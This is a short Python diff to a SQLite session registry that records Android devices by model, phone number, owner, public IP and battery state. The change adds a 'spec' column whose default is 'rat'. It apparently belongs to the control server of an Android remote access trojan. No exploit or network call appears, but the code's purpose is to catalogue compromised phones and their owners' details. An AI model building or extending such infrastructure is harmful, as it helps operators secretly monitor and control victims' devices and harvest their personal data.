@@ -107,7 +107,7 @@ def _connect() -> sqlite3.Connection:
 
 
 MIGRATIONS = {
-    "sessions": {"kind": "TEXT NOT NULL DEFAULT 'apk'"},
+    "sessions": {"kind": "TEXT NOT NULL DEFAULT 'apk'", "spec": "TEXT NOT NULL DEFAULT 'rat'"},
 }
 
 
@@ -157,11 +157,12 @@ def register(sid: str, meta: Dict[str, Any], pub_ip: str, kind: str = "apk") -> 
     field is coerced; unknown keys are ignored rather than stored raw."""
     now = time.time()
     label = str(meta.get("label") or meta.get("model") or sid[:8])[:64]
+    spec = str(meta.get("spec") or "rat")[:24]
     sdk = int(meta.get("sdk") or 0) if str(meta.get("sdk") or "0").isdigit() else 0
     _exec(
         """INSERT INTO sessions (sid, label, model, android, sdk, abi, phone, owner,
-                                first_seen, last_seen, pub_ip, battery, charging, online, kind)
-           VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,1,?)
+                                first_seen, last_seen, pub_ip, battery, charging, online, kind, spec)
+           VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,1,?,?)
            ON CONFLICT(sid) DO UPDATE SET
              last_seen=excluded.last_seen, pub_ip=excluded.pub_ip,
              battery=CASE WHEN excluded.battery > 0 THEN excluded.battery ELSE sessions.battery END,
@@ -171,7 +172,7 @@ def register(sid: str, meta: Dict[str, Any], pub_ip: str, kind: str = "apk") -> 
             sid, label, str(meta.get("model") or "")[:80], str(meta.get("android") or "")[:16],
             sdk, str(meta.get("abi") or "")[:24], str(meta.get("phone") or "")[:24],
             str(meta.get("owner") or "")[:80], now, now, pub_ip,
-            _int(meta.get("battery")), _int(meta.get("charging")), kind[:16],
+            _int(meta.get("battery")), _int(meta.get("charging")), kind[:16], spec,
         ),
     )
     return get_session(sid) or {}
